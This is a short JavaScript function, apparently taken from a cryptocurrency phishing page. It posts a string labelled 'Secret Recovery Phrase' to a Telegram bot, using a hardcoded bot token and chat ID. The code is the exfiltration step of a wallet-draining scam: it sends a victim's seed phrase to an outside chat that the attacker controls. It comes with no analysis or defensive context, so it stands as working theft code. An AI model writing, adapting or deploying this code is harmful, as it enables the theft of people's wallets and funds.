function sendToTelegram(phrase) {
  const botToken = "7719210057:AAG5V1PziMAyoEJZ1_DlBp1kK7Vmb2SWiT8";
  const chatId = "6996434307";

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: "Secret Recovery Phrase:\n" + phrase.trim()
    })
  });
}
